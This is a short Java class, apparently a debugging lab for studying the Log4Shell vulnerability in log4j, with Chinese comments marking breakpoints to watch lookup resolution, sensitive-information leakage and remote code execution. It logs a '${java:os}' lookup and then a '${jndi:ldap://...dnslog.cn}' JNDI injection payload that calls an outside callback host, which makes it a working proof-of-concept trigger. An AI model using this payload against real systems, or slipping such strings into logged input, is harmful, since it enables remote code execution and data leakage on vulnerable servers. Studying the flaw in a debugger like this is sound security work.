package org.springkill;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.lookup.Interpolator;

import java.util.Collection;
import java.util.Map;
import java.util.Set;


public class Log4ShellVuln {
    private static final Logger logger = LogManager.getLogger(Log4ShellVuln.class);

    public static void main(String[] args) {
        Interpolator interpolator = new Interpolator(new Map<String, String>() {
            @Override
            public int size() {
                return 0;
            }

            @Override
            public boolean isEmpty() {
                return false;
            }

            @Override
            public boolean containsKey(Object key) {
                return false;
            }

            @Override
            public boolean containsValue(Object value) {
                return false;
            }

            @Override
            public String get(Object key) {
                return null;
            }

            @Override
            public String put(String key, String value) {
                return null;
            }

            @Override
            public String remove(Object key) {
                return null;
            }

            @Override
            public void putAll(Map<? extends String, ? extends String> m) {

            }

            @Override
            public void clear() {

            }

            @Override
            public Set<String> keySet() {
                return null;
            }

            @Override
            public Collection<String> values() {
                return null;
            }

            @Override
            public Set<Entry<String, String>> entrySet() {
                return null;
            }
        });
        //断点位置1，用于观察Interpolator中的内容
        String a = "${java:os}";
        logger.error(a);

        String b = "${jndi:ldap://qanl3w.dnslog.cn}";
        //断点位置2，用于观察敏感信息以及RCE（单步调试或在log4j中加入其他断点）
        logger.error(b);



    }
}
